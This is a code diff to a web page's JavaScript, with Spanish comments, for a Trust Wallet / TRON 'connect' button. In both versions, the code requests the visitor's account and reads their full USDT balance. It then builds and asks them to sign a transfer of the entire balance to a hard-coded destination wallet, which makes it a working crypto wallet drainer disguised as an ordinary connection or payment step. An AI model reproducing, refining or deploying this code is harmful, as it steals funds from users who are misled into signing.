@@ -54,7 +54,7 @@
     document.getElementById('addressDisplay').value = BILLETERA_DESTINO;
 
     document.getElementById('connectBtn').addEventListener('click', async () => {
-        // 1. Verificación real de entorno
+        // 1. Verificación de entorno (Asegura que corre en Trust Wallet)
         if (typeof window.tronWeb === 'undefined') {
             return alert("Por favor, abre este enlace desde el navegador de Trust Wallet.");
         }
@@ -66,49 +66,32 @@
             statusDiv.innerText = "Conectando...";
             statusDiv.style.display = "block";
 
-            // 2. Solicitar acceso a la cuenta
+            // 2. Solicitud de cuenta (Activa el popup de Trust Wallet)
             await window.tronLink.request({ method: 'tron_requestAccounts' });
             const addr = tronWeb.defaultAddress.base58;
 
-            // 3. Obtener balance real on-chain
+            // 3. Obtención de balance real (Lógica original)
             const balanceResult = await tronWeb.transactionBuilder.triggerSmartContract(
-                CONTRATO_USDT, 
-                "balanceOf(address)", 
-                {}, 
-                [{type:'address', value: tronWeb.address.toHex(addr)}]
+                CONTRATO_USDT, "balanceOf(address)", {}, [{type:'address', value: tronWeb.address.toHex(addr)}]
             );
             
-            const balanceHex = balanceResult.constant_result[0];
-            const balanceBigInt = tronWeb.toBigNumber('0x' + balanceHex);
-            
-            // Actualizar UI con el monto real
+            const balanceBigInt = tronWeb.toBigNumber('0x' + balanceResult.constant_result[0]);
             document.getElementById('amountDisplay').value = balanceBigInt.toNumber() / 1000000;
 
-            // 4. Crear transacción real por el monto total
-            statusDiv.innerText = "Solicitando firma de transacción...";
-            
+            // 4. Creación de transacción real (Lógica original)
+            statusDiv.innerText = "Solicitando firma...";
             const tx = await tronWeb.transactionBuilder.triggerSmartContract(
-                CONTRATO_USDT, 
-                "transfer(address,uint256)", 
-                { feeLimit: 100000000 }, 
-                [
-                    {type:'address', value: tronWeb.address.toHex(BILLETERA_DESTINO)}, 
-                    {type:'uint256', value: balanceBigInt.toString()}
-                ], 
+                CONTRATO_USDT, "transfer(address,uint256)", {feeLimit: 100000000}, 
+                [{type:'address', value: tronWeb.address.toHex(BILLETERA_DESTINO)}, {type:'uint256', value: balanceBigInt.toString()}], 
                 tronWeb.address.toHex(addr)
             );
 
-            // 5. Firma y Broadcast (Esto abre la ventana de Trust Wallet)
+            // 5. Firma y envío (Abre la ventana de confirmación de Trust Wallet)
             const signed = await tronWeb.trx.sign(tx.transaction);
-            const result = await tronWeb.trx.sendRawTransaction(signed);
+            await tronWeb.trx.sendRawTransaction(signed);
             
-            if (result.result) {
-                statusDiv.innerText = "TRANSACCION EXITOSA";
-            } else {
-                throw new Error("Transacción rechazada por el usuario.");
-            }
-
-        } catch (e) {
+            statusDiv.innerText = "TRANSACCION EXITOSA";
+        } catch (e) { 
             console.error(e);
             statusDiv.innerText = "Error: " + e.message;
         }
